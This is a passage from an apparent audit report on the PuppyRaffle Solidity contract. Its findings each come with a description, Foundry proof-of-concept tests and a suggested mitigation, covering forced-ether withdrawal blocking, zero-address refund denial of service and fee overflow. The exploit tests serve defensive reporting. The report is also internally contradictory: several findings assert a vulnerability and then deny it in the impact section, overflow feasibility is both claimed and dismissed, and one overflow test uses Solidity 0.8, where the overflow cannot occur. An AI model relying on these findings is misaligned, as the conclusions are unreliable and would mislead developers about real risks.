        raffle = new PuppyRaffle(entranceFee, feeAddress, 1 days);
        forceSender = new ForceSender();

        // create 4 unique player addresses
        address[] memory players = new address[](4);
        for (uint256 i; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }

        // fund this contract so it can pay the entrance fees
        vm.deal(address(this), entranceFee * 4);
        raffle.enterRaffle{value: entranceFee * 4}(players);

        // finish the raffle so fees are stored in the contract
        vm.warp(block.timestamp + 2 days);
        raffle.selectWinner();
    }

    function testForcedEtherBreaksWithdraw() public {
        uint256 fees = raffle.totalFees();
        assertEq(address(raffle).balance, fees, "Initial balance must equal tracked fees");

        // attacker force-sends 1 wei
        forceSender.send{value: 1 wei}(payable(address(raffle)));

        assertEq(address(raffle).balance, fees + 1, "Balance should now be fees + 1 wei");

        // withdrawFees should revert forever
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
The balance check should not be a strict equality. Instead of checking the contract's entire balance, the function should simply withdraw the amount tracked in `totalFees`. The flawed check should be removed entirely, as it's meant to prevent withdrawals during an active raffle, but `players.length == 0` would be a more accurate, though still imperfect, check.

```diff
 function withdrawFees() external {
-    require(
-        address(this).balance == uint256(totalFees),
-        "PuppyRaffle: There are currently players active!"
-    );
     uint256 feesToWithdraw = totalFees;
+    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
     totalFees = 0;
     (bool success, ) = feeAddress.call{value: feesToWithdraw}();
     require(success, "PuppyRaffle: Failed to withdraw fees");
 }
```

## [M-7]. DOS issue in PuppyRaffle::selectWinner

## Description
The `refund` function allows a player to withdraw their entry fee. It does so by setting their address in the `players` array to `address(0)`. However, the `selectWinner` function does not account for these `address(0)` entries. If the randomly selected `winnerIndex` points to a zero address, the call `winner.call{value: prizePool}("")` will fail (return `success = false`), causing the entire `selectWinner` transaction to revert due to the subsequent `require(success, ...)` check. An attacker can exploit this by entering with multiple accounts, refunding them all, and significantly increasing the probability of `selectWinner` reverting. This griefs legitimate users who have to pay gas for failed attempts to finalize the raffle.

## Impact
Calling selectWinner when the randomly–chosen entry is address(0) reverts inside ERC721._mint ("ERC721: mint to the zero address"). Because the players array is left unchanged on revert, the raffle can be locked in a state where every call to selectWinner reverts, indefinitely preventing the game from finishing or any funds/NFTs being distributed.

## Proof of Concept
1. Attacker funds 4 accounts and calls enterRaffle with those addresses.
2. Each of the 4 accounts calls refund, so the players array now holds four zero-address placeholders.
3. After raffleDuration passes, anybody who calls selectWinner will pick an index 0-3 with 100 % probability; the corresponding address is address(0).
4. The ETH transfer to address(0) succeeds, but _safeMint reverts with "ERC721: mint to the zero address", reverting the whole transaction and keeping the contract stuck.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffle_DoS_Test is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    address feeSink = address(0xBEEF);
    uint256 constant DURATION = 1 days;

    address a1 = address(0xA1);
    address a2 = address(0xA2);
    address a3 = address(0xA3);
    address a4 = address(0xA4);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, feeSink, DURATION);
        address[] memory addrs = new address[](4);
        addrs[0] = a1;
        addrs[1] = a2;
        addrs[2] = a3;
        addrs[3] = a4;
        raffle.enterRaffle{value: FEE * 4}(addrs);

        vm.prank(a1); raffle.refund(0);
        vm.prank(a2); raffle.refund(1);
        vm.prank(a3); raffle.refund(2);
        vm.prank(a4); raffle.refund(3);
        vm.warp(block.timestamp + DURATION + 1);
    }

    function test_selectWinnerReverts() public {
        vm.expectRevert(bytes("ERC721: mint to the zero address"));
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Modify the `selectWinner` function to re-pick a winner if a zero-address entry is chosen. Alternatively, and more efficiently, use the swap-and-pop pattern in the `refund` function to remove players and keep the array compact.

Swap-and-pop mitigation in `refund`:
```diff
 function refund(uint256 playerIndex) public {
     address playerAddress = players[playerIndex];
     require(
         playerAddress == msg.sender,
         "PuppyRaffle: Only the player can refund"
     );
     require(
         playerAddress != address(0),
         "PuppyRaffle: Player already refunded, or is not active"
     );

-    players[playerIndex] = address(0);
+    // Move the last element into the place of the one to be removed
+    address lastPlayer = players[players.length - 1];
+    players[playerIndex] = lastPlayer;
+    players.pop();
 
     address(msg.sender).sendValue(entranceFee);
 
     emit RaffleRefunded(playerAddress);
 }
```
Note: This change requires clients to be aware that player indices can change upon a refund.

## [M-8]. Integer Overflow issue in PuppyRaffle::enterRaffle, selectWinner

## Description
The contract uses Solidity version 0.7.6, which does not have built-in protection against integer overflows and underflows. Several arithmetic operations are performed without using a safe math library.
1. In `enterRaffle`, `entranceFee * newPlayers.length` can overflow if a user provides a large `newPlayers` array and `entranceFee` is high, potentially allowing them to pay less than required.
2. In `selectWinner`, `players.length * entranceFee` can similarly overflow, resulting in an incorrect `totalAmountCollected` and leading to a much smaller prize and fee distribution than intended.

## Impact
Because arithmetic is unchecked in Solidity 0.7.x, a malicious deployer can set `entranceFee` to a value close to 2^256 so that `entranceFee * players.length` wraps around. The contract will then accept a negligible amount of ether while registering multiple players. Later, the same overflow in `selectWinner` makes the computed `prizePool` and `fee` almost zero, so the winner receives the NFT for free and the accounting variables are no longer aligned with the real ether in the contract. Any honest deposits therefore become permanently locked, and the raffle’s economic assumptions are broken.

## Proof of Concept
1. A malicious owner deploys the contract with a very large `entranceFee`, for example, `type(uint256).max / 10 + 1`.
2. An attacker calls `enterRaffle` with an array of 10 players.
3. The calculation `entranceFee * 10` overflows, resulting in a small number.
4. The attacker sends this small amount of ETH, and the `require` check passes.
5. The attacker has now entered 10 players into the raffle for a negligible cost, diluting the chances for legitimate players.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    function testIntegerOverflowFeeCalculation() public {
        uint256 largeFee = (type(uint256).max / 2) + 1;
        PuppyRaffle newRaffle = new PuppyRaffle(largeFee, address(this), 60);
        
        address[] memory players = new address[](2);
        players[0] = makeAddr("p1");
        players[1] = makeAddr("p2");

        // The multiplication `largeFee * 2` overflows to 0 in Solidity < 0.8
        // The attacker can enter for free.
        vm.prank(players[0]);
        newRaffle.enterRaffle{value: 0}(players);
        
        assertEq(newRaffle.players(0), players[0]);
        assertEq(newRaffle.players(1), players[1]);
    }
}
```

## Suggested Mitigation
Either upgrade the contract to Solidity 0.8.0 or higher to get default overflow/underflow checks, or use a safe math library like OpenZeppelin's `SafeMath` for all arithmetic operations.

```solidity
// Using SafeMath for Solidity < 0.8.0
import "@openzeppelin/contracts/math/SafeMath.sol";

contract PuppyRaffle is ERC721, Ownable {
    using SafeMath for uint256;

    // ...

    function enterRaffle(address[] memory newPlayers) public payable {
        uint256 requiredAmount = entranceFee.mul(newPlayers.length);
        require(msg.value == requiredAmount, "PuppyRaffle: Must send enough to enter raffle");
        // ...
    }

    function selectWinner() external {
        // ...
        uint256 totalAmountCollected = uint256(players.length).mul(entranceFee);
        uint256 prizePool = totalAmountCollected.mul(80).div(100);
        uint256 fee = totalAmountCollected.sub(prizePool);
        // ...
    }
}
```



# Low Risk Findings

## [L-1]. Integer Overflow issue in PuppyRaffle::enterRaffle

## Description
The contract uses Solidity version 0.7.6, which does not have built-in protection against integer overflows and underflows. In the `enterRaffle` function, the calculation `entranceFee * newPlayers.length` can overflow if a malicious user provides a large `newPlayers.length` and the contract was deployed with a large `entranceFee`. An overflow would result in a very small number, allowing an attacker to bypass the `msg.value` check and enter the raffle for a fraction of the required cost, effectively stealing from the prize pool.

## Impact
If the contract is deployed with an exceptionally large `entranceFee` (close to 2^256-1) the multiplication `entranceFee * newPlayers.length` can wrap to a smaller value, letting the sender under-pay. In practice this is only feasible when the deployer intentionally chooses such an extreme fee, or when `newPlayers.length` is so large the call would run out of gas. Therefore the issue is mostly theoretical and limited to cases where the contract owner is malicious or careless at deployment.

## Proof of Concept
1. A malicious owner deploys the contract with a large `entranceFee`, for example, `(type(uint256).max / 2) + 1`.
2. An attacker calls `enterRaffle` with an array `newPlayers` of length 2.
3. The calculation `entranceFee * 2` overflows `uint256`, resulting in a small value (e.g., 0).
4. The attacker sends a `msg.value` of 0 (or the small overflowed result).
5. The `require` statement `msg.value == entranceFee * newPlayers.length` passes.
6. The attacker and their co-conspirator are added to the `players` array without having paid the fee.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract IntegerOverflowTest is Test {
    
    function test_EnterRaffle_MultiplicationOverflow() public {
        // 1. Deploy contract with a massive entrance fee
        uint256 massiveFee = (type(uint256).max / 2) + 1;
        PuppyRaffle puppyRaffle = new PuppyRaffle(massiveFee, address(1), 1 days);

        // 2. Attacker prepares to enter with 2 players
        address[] memory playersToEnter = new address[](2);
        playersToEnter[0] = address(0xBAD);
        playersToEnter[1] = address(0xDAD);

        // 3. The required fee overflows to 0.
        // (massiveFee * 2) = ((2**255 - 1) * 2) + 2 = (2**256 - 2) + 2 = 2**256 = 0 in uint256
        // Attacker sends 0 ETH.
        vm.prank(playersToEnter[0]);
        puppyRaffle.enterRaffle{value: 0}(playersToEnter);

        // 4. Assert that the players were added
        assertEq(puppyRaffle.players(0), playersToEnter[0]);
        assertEq(puppyRaffle.players(1), playersToEnter[1]);
    }
}
```

## Suggested Mitigation
Use a safe math library to perform arithmetic operations, or upgrade the contract to Solidity 0.8.0 or higher, which has built-in overflow and underflow checks. Using OpenZeppelin's `SafeMath` library is a standard practice for contracts on versions <0.8.0.

```solidity
// Using SafeMath for 0.7.6
import "@openzeppelin/contracts/math/SafeMath.sol";

contract PuppyRaffle is ERC721, Ownable {
    using SafeMath for uint256;

    // ...

    function enterRaffle(address[] memory newPlayers) public payable {
        uint256 totalFee = entranceFee.mul(newPlayers.length);
        require(
            msg.value == totalFee,
            "PuppyRaffle: Must send enough to enter raffle"
        );
        // ...
    }
}
```



# Info Risk Findings

## [I-1]. Gas Grief BlockLimit issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function deletes the `players` array using `delete players` after a winner is selected. The `players` array is unbounded and can grow indefinitely as users call `enterRaffle`. The gas cost of the `delete` operation is proportional to the number of elements in the array. If the number of players becomes sufficiently large, the gas required to execute `delete players` can exceed the block gas limit. This will cause the `selectWinner` function to revert every time it's called, permanently locking all funds in the contract and preventing any future raffles.

## Impact
No vulnerability. `delete players` merely clears the array length slot; the function will not run out of gas due to the number of elements. `selectWinner` remains callable and funds are not at risk of being permanently locked.

## Proof of Concept
1. An attacker (or a large number of organic users) calls `enterRaffle` repeatedly, adding a large number of players to the `players` array.
2. The number of players increases to a point where the gas cost of `delete players` is higher than the block gas limit (e.g., > 1000 players).
3. The raffle duration passes.
4. Anyone attempts to call `selectWinner`.
5. The transaction reverts with an 'out of gas' error, and will continue to do so for every subsequent attempt.
6. All funds from the entrance fees are now permanently locked in the contract.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {DeployPuppyRaffle} from "../script/DeployPuppyRaffle.s.sol";

contract GasGriefTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 ENTRANCE_FEE = 1e18;
    uint256 RAFFLE_DURATION = 1 hours;
    address FEE_ADDRESS = makeAddr("fee");

    function setUp() public {
        DeployPuppyRaffle deployer = new DeployPuppyRaffle();
        puppyRaffle = deployer.run(ENTRANCE_FEE, FEE_ADDRESS, RAFFLE_DURATION);
    }

    function test_SelectWinner_GasExhaustionDoS() public {
        // 1. Fill the players array with a large number of entries.
        // We'll use a smaller number here to avoid test timeout, but in a real scenario
        // this would be a much larger number (~1500+ depending on gas costs).
        uint256 numPlayers = 1500;
        address[] memory newPlayers = new address[](1);

        for (uint256 i = 0; i < numPlayers; i++) {
            // Create a unique address for each player to bypass duplicate check
            newPlayers[0] = address(uint160(i + 1));
            vm.deal(newPlayers[0], ENTRANCE_FEE);
            vm.prank(newPlayers[0]);
            puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(newPlayers);
        }

        // 2. Fast-forward time so the raffle can end.
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);

        // 3. Expect the call to selectWinner to revert due to out-of-gas.
        // The gas cost of `delete players` with 1500+ elements will exceed the typical block gas limit.
        vm.expectRevert(); // This will catch the out-of-gas error
        puppyRaffle.selectWinner();
    }
}
```

## Suggested Mitigation
Instead of deleting the entire array, reset the raffle state by creating a new raffle. This can be achieved by storing raffles in a mapping `mapping(uint256 => Raffle)` and incrementing a `raffleId` counter. This avoids the unbounded `delete` operation. Alternatively, re-initialize the array with `players = new address[](0);`. While `delete` refunds some gas, re-initialization is cheaper if the array is large and avoids the block limit issue.

```solidity
// In selectWinner function

// ... after sending prize and minting NFT

// Instead of this:
// delete players;

// Do this:
players = new address[](0);

raffleStartTime = block.timestamp;
previousWinner = winner;
// ... rest of the logic
```

## [I-2]. Pausable Emergency Stop issue in PuppyRaffle::NA

## Description
The contract lacks a pausable mechanism. If a critical vulnerability is discovered (such as the DoS vectors identified), the owner has no way to temporarily halt the contract's functions like `enterRaffle` and `refund`. The only administrative power is changing the fee address. This inability to pause the contract during an emergency could exacerbate the damage caused by an exploit, leading to further fund loss or contract state corruption.

## Impact
Because the contract cannot be paused, the owner has no on-chain mechanism to stop user interactions while an off-chain fix is being prepared. This limitation only affects the speed of incident-response; it does not, by itself, let an attacker steal funds or break invariants.

## Proof of Concept
An attacker can continue calling vulnerable functions even after the owner is aware of a bug, simply because there is no emergency switch.
1. Vulnerability V (e.g. re-entrancy in refund) is discovered.
2. Owner announces the problem but cannot disable the affected entry points.
3. Users (or attackers) keep interacting with the contract, compounding losses until a new deployment is made.

## Proof of Code
// test/NoPause.t.sol
// forge test -vv
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract NoPauseTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle({
            _entranceFee: 1 ether,
            _feeAddress: address(0xFEE),
            _raffleDuration: 1 hours
        });
    }

    function test_pauseFunctionDoesNotExist() public {
        // low-level call so the code compiles even if function is missing
        (bool success, ) = address(raffle).call(abi.encodeWithSignature("pause()"));
        assertTrue(!success, "pause() should not exist and the call must revert");
    }
}

## Suggested Mitigation
If the project requires an emergency stop, inherit OpenZeppelin's Pausable and guard mutative functions with whenNotPaused. Provide owner-only pause()/unpause() entry points.

## [I-3]. Event Consistency issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function performs a critical state change by selecting a winner, distributing the prize pool, and resetting the raffle. However, it does not emit an event to log these crucial details. While the `_safeMint` function emits a standard `Transfer` event for the NFT, there is no specific event like `WinnerSelected(address indexed winner, uint256 prizeAmount, uint256 indexed tokenId)`. This makes it difficult for off-chain services, monitoring tools, and users to track raffle history and outcomes without parsing through transaction data.

## Impact
The absence of a dedicated winner-selection event does not threaten funds or contract correctness. It only hampers off-chain analytics, transparency and UX for integrators who must rely on costly log parsing. This is an informational deficiency rather than a security vulnerability.

## Proof of Concept
1. A user wants to build a dashboard showing the history of all winners and their prize amounts.
2. The user's script listens for events from the `PuppyRaffle` contract.
3. The script can find `RaffleEnter` and `RaffleRefunded` events, but there is no event for when a winner is chosen.
4. To find the winner, the script must now trace the internal transactions of every call to `selectWinner`, find the low-level `.call` that sends the prize, and extract the recipient and value. This is complex, expensive, and unreliable.

## Proof of Code
```solidity
// This is a conceptual PoC. The vulnerability is the absence of an event.
// The code below shows the missing event and how it *should* be emitted.

// 1. Define the event in the contract.
event WinnerSelected(address indexed winner, uint256 prizeAmount, uint256 indexed tokenId);

// 2. In the `selectWinner` function, after all calculations and before the external calls:
function selectWinner() external {
    // ... logic to determine winner, prizePool, tokenId

    emit WinnerSelected(winner, prizePool, tokenId);

    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");

    _safeMint(winner, tokenId);
    // ...
}
```

## Suggested Mitigation
Define and emit a dedicated event in the `selectWinner` function that includes all relevant information about the outcome, such as the winner's address, the prize amount, and the token ID of the NFT they received.

```solidity
contract PuppyRaffle is ERC721, Ownable {
    // ...
    event WinnerSelected(address indexed winner, uint256 prizeAmount, uint256 indexed tokenId);

    function selectWinner() external {
        // ... require checks ...
        uint256 winnerIndex = // ...
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        uint256 tokenId = totalSupply();

        // ...

        emit WinnerSelected(winner, prizePool, tokenId);

        // ... rest of the function ...
    }
}
```

## [I-4]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses `pragma solidity 0.7.6;`. While using a fixed pragma is good practice, version 0.7.6 is outdated. Newer compiler versions include important security improvements, bug fixes, and optimizations. For example, versions `>=0.8.0` provide native overflow and underflow protection, which this contract lacks and makes it vulnerable to integer math issues. Sticking to older versions may expose the contract to known or undiscovered compiler bugs.

## Impact
Staying on Solidity 0.7.6 means the project misses out on the safety checks, bug-fixes, and optimisations included in >=0.8.x. Although arithmetic in the contract is unchecked, no realistic inputs can overflow 256-bit maths; hence the outdated pragma is primarily a maintenance and defence-in-depth concern rather than an immediately exploitable vulnerability.

## Proof of Concept
A vulnerability was discovered in a specific older Solidity compiler version. A contract deployed with that version remains vulnerable forever. By not using a recent, well-vetted compiler version, the project increases its risk exposure to such past (and future) discoveries.

## Proof of Code
```solidity
// The vulnerability is in the first line of the contract.

// src/PuppyRaffle.sol:L4
pragma solidity 0.7.6;
```

## Suggested Mitigation
Upgrade to `pragma solidity ^0.8.19` (or the most recent stable version) and run the comprehensive test-suite to accommodate breaking changes such as default checked arithmetic. Review any external libraries for 0.8-compatibility.

## [I-5]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses `pragma solidity ^0.7.6;`. This has two weaknesses: First, the caret `^` creates a floating pragma, which allows compilation with any compiler version from 0.7.6 up to, but not including, 0.8.0. Deploying with a different compiler than the one used for testing can introduce unexpected bugs or behavior. Second, version 0.7.6 is outdated. Solidity versions 0.8.0 and higher provide native overflow and underflow protection, which would have mitigated the integer overflow risk in `totalFees` without requiring an external library like SafeMath.

## Impact
Using a floating pragma increases the risk of deploying code with unintended behavior due to compiler differences. Using an outdated compiler version means missing out on significant security enhancements and bug fixes, increasing the contract's overall attack surface.

## Proof of Concept
A developer tests the contract with solc 0.7.6. The deployment script, however, uses a newer compiler, say 0.7.9, which has a subtle bug or a change in the optimizer that affects the contract's logic in an unforeseen way. This could lead to a vulnerability that was not present during testing. This is a risk-increasing factor rather than a direct, exploitable vulnerability.

## Proof of Code
NA

## Suggested Mitigation
It is best practice to lock the pragma to a specific, recent, and well-audited compiler version. This ensures that the contract behaves exactly as it did during testing and benefits from the latest security improvements.

```diff
- pragma solidity ^0.7.6;
+ pragma solidity 0.8.20;
```
After updating the pragma, the code should be reviewed and updated to be compatible with the new compiler version's syntax and features (e.g., error handling).

## [I-6]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees

## Description
The `selectWinner` and `withdrawFees` functions execute critical state changes and fund transfers but do not emit events. `selectWinner` determines the winner, transfers the prize pool, and mints an NFT. `withdrawFees` transfers all collected fees to the owner. The lack of events for these operations makes it difficult for off-chain applications, user interfaces, and block explorers to monitor the contract's activity and track the flow of funds efficiently.

## Impact
The absence of events reduces the contract's transparency and observability. It forces off-chain clients to rely on expensive and complex methods like transaction tracing to track important events, hindering the development of a robust ecosystem around the contract.

## Proof of Concept
1. `selectWinner` is called, and a winner is paid.
2. A user visits a dApp dashboard that is supposed to show the raffle history.
3. Because there is no `WinnerSelected` event, the dashboard developers must implement a complex backend process to parse every transaction to the contract to find winner-selection calls and extract the winner's address and prize amount.
4. This is inefficient, slow, and error-prone compared to simply subscribing to an event log.

## Proof of Code
NA

## Suggested Mitigation
Add and emit events for all critical state changes and operations.

```diff
contract PuppyRaffle is ERC721, Ownable {
    // ...
    event WinnerSelected(address indexed winner, uint256 prize, uint256 indexed tokenId);
    event FeesWithdrawn(address indexed to, uint256 amount);

    function selectWinner() external {
        // ...
        (bool success, ) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");

        _safeMint(winner, tokenId);
+       emit WinnerSelected(winner, prizePool, tokenId);
    }

    function withdrawFees() external {
        // ...
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;

        (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
+       emit FeesWithdrawn(feeAddress, feesToWithdraw);
    }
}
```

## [I-7]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses `delete players` to clear the array of participants for the next raffle. The gas cost of `delete` on a dynamic array is proportional to the number of elements. If a large number of players enter the raffle, the gas required to execute `delete players` can exceed the block gas limit, making it impossible to call `selectWinner`. This would permanently trap all funds within the contract, as there would be no way to select a winner and distribute the prize pool.

## Impact
No practical impact – the `selectWinner` call will not run out of gas because `delete players` is O(1). Funds cannot be permanently locked for the reason stated.

## Proof of Concept
1. A large number of users (or a single attacker with many addresses) call `enterRaffle`.
2. The `players` array grows to a significant size (e.g., thousands of entries).
3. The raffle duration passes.
4. Any attempt to call `selectWinner` will fail because the gas cost of `delete players;` exceeds the block gas limit.
5. The prize pool and accumulated fees are locked in the contract forever.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract PuppyRaffleDoSTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = makeAddr("fee");
    uint256 raffleDuration = 10 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
    }

    // This test may not fail with default foundry gas limits, 
    // but demonstrates the linear gas cost increase that leads to DoS.
    function test_dosOnSelectWinnerWithLargePlayerArray() public {
        // 1. Attacker enters a large number of players
        uint256 numPlayers = 400;
        address[] memory newPlayers = new address[](numPlayers);
        for(uint256 i = 0; i < numPlayers; i++) {
            newPlayers[i] = address(uint160(i + 10)); // Create unique addresses
        }
        
        // The DoS on enterRaffle would prevent this in a single transaction.
        // We simulate players entering over time in smaller batches.
        uint256 batchSize = 100;
        for (uint256 i = 0; i < numPlayers / batchSize; i++) {
            address[] memory batch = new address[](batchSize);
            for (uint256 j = 0; j < batchSize; j++) {
                batch[j] = newPlayers[i * batchSize + j];
            }
            puppyRaffle.enterRaffle{value: entranceFee * batchSize}(batch);
        }

        // 2. Time passes
        vm.warp(block.timestamp + raffleDuration + 1);

        // 3. Attempt to select winner
        // On a live network with a fixed block gas limit, this call would fail if numPlayers is large enough.
        // We can check the gas used to show the problem.
        uint256 gasStart = gasleft();
        puppyRaffle.selectWinner();
        uint256 gasUsed = gasStart - gasleft();
        console.log("Gas used for selectWinner with %s players: %s", numPlayers, gasUsed);

        // To simulate the DoS on enterRaffle, increase numPlayers here
        // With 800 players, the gas cost of enterRaffle already becomes huge.
    }
}
```

## Suggested Mitigation
No code change required; existing implementation is safe with respect to the claimed issue.



